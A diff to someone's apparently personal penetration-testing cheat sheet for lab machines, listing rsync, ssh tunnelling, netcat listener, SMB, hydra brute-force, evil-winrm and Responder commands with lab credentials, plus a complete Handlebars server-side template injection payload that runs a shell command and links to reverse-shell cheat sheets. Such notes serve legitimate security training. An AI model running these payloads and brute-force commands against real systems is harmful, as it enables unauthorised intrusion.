@@ -1,7 +1,24 @@
+Linux tools:
 Rsync is a fast and extraordinarily versatile file copying tool. I
 rsync --list-only {target_IP}::
 rsync --list-only {target_IP}::public
 rsync {target_IP}::public/flag.txt flag.txt
+>ss -tln
+-l: Display only listening sockets.
+-t: Display TCP sockets.
+-n: Do not try to resolve service names.
+Tunneling with ssh: >ssh -L 1234:localhost:22 user@remote.example.co
+In the scenario we are currently facing, we want to forward traffic from any given local port, for instance 
+1234 , to the port on which PostgreSQL is listening, namely 5432 , on the remote server
+>ssh -L 1234:localhost:5432 christine@{target_IP}
+NETCat
+nc -lvnp
+l : Listening mode.
+v : Verbose mode. Displays status messages in more detail.
+n : Numeric-only IP address. No hostname resolution. DNS is not being used.
+p : Port. Use to specify a particular port for listening
+smbclient  \\\\10.10.10.131\\ADMIN$ -U Administrator
+
 
 Nmap stuff ################################################################
 >nmap -p- --min-rate=1000 -sV {target_IP}
@@ -30,10 +47,17 @@ gobuster:
         -u : Specify the URL
     >>>>>>>>>>>: If using Gobuster version 3.2.0 and above we also have to add the --append-domain<<<<<<<<<
 
+Brute Force password cracking:
+hydra -L usernames.txt -p 'funnel123#!#' {target_IP} ssh
+
 
 
 Connect to remote desktop using xfreerdp:
 >xfreerdp /v:{target_IP} /cert:ignore /u:Administrator
+WinRM evel:
+evil-winrm -i 10.129.136.91 -u administrator -p badminton
+
+
 
 Redis connect:
 redis-cli -h {target_ip}
@@ -44,5 +68,45 @@ mssql -h {target_IP} -u root
 Responder:
 Look at Responder.conf to make sure everything is turned on.
 sudo python3 Responder.py -I tun0
-
 then coneect back to it and see what happens
+
+Wappaliyzer:
+Web add in shows you what platform is bing run.
+
+
+BurpSuite:
+Super good for sending unintended shit to a web page
+
+
+Server Side Template Injection vulnerability Example injection:
+{{#with "s" as |string|}}
+ {{#with "e"}}
+ {{#with split as |conslist|}}
+ {{this.pop}}
+ {{this.push (lookup string.sub "constructor")}}
+ {{this.pop}}
+ {{#with string.split as |codelist|}}
+ {{this.pop}}
+ {{this.push "return process.mainModule.require('child_process').execSync('ls 
+/root');"}}
+ {{this.pop}}
+ {{#each conslist}}
+ {{#with (string.sub.apply 0 codelist)}}
+ {{this}}
+ {{/with}}
+ {{/each}}
+ {{/with}}
+ {{/with}}
+ {{/with}}
+{{/with}}
+
+Usefull Links:
+============
+https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
+Reverse shell cheet sheet:
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+https://github.com/Hackplayers/evil-winrm
+https://github.com/SecureAuthCorp/impacket
+    python3 mssqlclient.py -h
+    python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
+https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
